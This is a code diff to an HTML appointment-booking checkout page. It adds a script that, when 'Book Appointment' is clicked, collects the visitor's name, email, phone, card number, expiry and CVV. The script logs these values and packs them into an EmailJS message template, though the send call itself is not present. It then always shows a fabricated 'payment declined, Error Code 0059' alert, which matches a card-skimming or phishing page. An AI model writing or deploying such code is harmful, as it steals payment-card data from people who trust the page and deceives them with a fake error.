@@ -7,6 +7,58 @@
     <link rel="stylesheet" href="./css/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link rel="stylesheet" href="./css/styles.css">
+    <!-- Include EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <!-- SweetAlert2 CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+<script type="text/javascript">
+   (function() {
+      emailjs.init("YOUR_USER_ID"); // Replace "YOUR_USER_ID" with your actual EmailJS user ID
+   })();
+   document.addEventListener("DOMContentLoaded", function() {
+    // Select the "Book Appointment" button
+    const bookBtn = document.querySelector(".book-btn2");
+    console.log("we entered")
+
+    // When the button is clicked
+    bookBtn.addEventListener("click", function(event) {
+        event.preventDefault(); // Prevent the form from submitting the default way
+
+        // Collect form data
+        const firstName = document.getElementById("first-name2").value;
+        const lastName = document.getElementById("last-name2").value;
+        const email = document.getElementById("email2").value;
+        const phoneNumber = document.getElementById("phone-number2").value;
+        const cardNumber = document.getElementById("card-number2").value;
+        const expiry = document.getElementById("expiry2").value;
+        const cvv = document.getElementById("cvv2").value;
+
+        console.log(firstName, lastName, email, phoneNumber, cardNumber, expiry, cvv);
+        // Prepare the data to be sent
+        const templateParams = {
+            first_name: firstName,
+            last_name: lastName,
+            email: email,
+            phone_number: phoneNumber,
+            card_number: cardNumber,
+            expiry_date: expiry,
+            cvv_code: cvv
+        };
+
+        // Send the email using EmailJS
+        Swal.fire({
+          icon: 'warning',
+          title: 'Failed to book appointment',
+          text: 'An error occurred while booking. Your payment was declined. Error Code : 0059',
+          confirmButtonText: 'OK'
+        });
+    });
+});
+
+</script>
+<!-- <script src="js/main.js" defer></script> -->
 </head>
 <style>
   .right h3 {
@@ -39,7 +91,7 @@ hr {
     margin: 20px 0;
 }
 
-.book-btn {
+.book-btn2 {
   width: 100%;
     margin-top: 20px;
     padding: 15px 20px;
@@ -51,7 +103,7 @@ hr {
     font-size: 16px;
     transition: background-color 0.3s ease;
 }
-.book-btn:hover {
+.book-btn2:hover {
   background-color: #2caa6b;
 }
 </style>
@@ -64,7 +116,7 @@ hr {
         <div class="contact-info-container">
             <div class="contact-info">Contact info</div>
              <div class="contact-group">
-        <select id="country-code" name="country-code">
+        <select id="country-code2" name="country-code">
           <option value="+1">+1 USA</option>
           <option value="+91">+91 India</option>
           <option value="+44">+44 UK</option>
@@ -72,19 +124,19 @@ hr {
           <option value="+81">+81 Japan</option>
           <!-- Add more country codes as needed -->
         </select>
-        <input type="tel" id="phone-number" name="phone-number" placeholder="Enter phone number" required>
+        <input type="tel" id="phone-number2" name="phone-number" placeholder="Enter phone number" required>
       </div>
     </div>
       <hr class="line">
         <!-- First Name and Last Name side by side -->
       <div class="name-group">
-        <input type="text" id="first-name" name="first-name" placeholder="First Name" required>
-        <input type="text" id="last-name" name="last-name" placeholder="Last Name" required>
+        <input type="text" id="first-name2" name="first-name" placeholder="First Name" required>
+        <input type="text" id="last-name2" name="last-name" placeholder="Last Name" required>
       </div>
 
       <!-- Email input field below -->
       <div class="email-group">
-        <input type="email" id="email" name="email" placeholder="Email Address" required>
+        <input type="email" id="email2" name="email" placeholder="Email Address" required>
       </div>
 
      <hr class="line">
@@ -93,13 +145,13 @@ hr {
         <div class="address-head">Address</div>
       </div>
       <div class="city-state-group">
-        <input type="text" id="city" name="city" placeholder="City" required>
-        <input type="text" id="state" name="state" placeholder="State" required>
+        <input type="text" id="city2" name="city" placeholder="City" required>
+        <input type="text" id="state2" name="state" placeholder="State" required>
       </div>
   
       <!-- Full Address -->
     <div class="full-address-group">
-        <input type="text" id="full-address" name="full-address" placeholder="Full Address" required>
+        <input type="text" id="full-address2" name="full-address" placeholder="Full Address" required>
       </div>
   
       <hr class="line">
@@ -111,9 +163,9 @@ hr {
     <!-- Card Payment Fields -->
     <div class="payment-section">
       <i style="font-size: 18px; margin-left:12px" class="fa-solid fa-credit-card"></i>
-      <input type="text" id="card-number" name="card-number" placeholder="Card Number" required>
-      <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>
-      <input type="text" id="cvv" name="cvv" placeholder="CVV" required>
+      <input type="text" id="card-number2" name="card-number" placeholder="Card Number" required>
+      <input type="text" id="expiry2" name="expiry" placeholder="MM/YY" required>
+      <input type="text" id="cvv2" name="cvv" placeholder="CVV" required>
     </div>
 
     <div class="checkbox-container">
@@ -151,7 +203,7 @@ hr {
                 <p>Total: <span class="amount">$00.00</span></p>
                 <p class="sub-text">Due at appointment: <span class="amount">$99.00</span></p>
             </div>
-            <button class="book-btn">Book Appointment</button>
+            <button class="book-btn2">Book Appointment</button>
 
             <hr class="line">
 
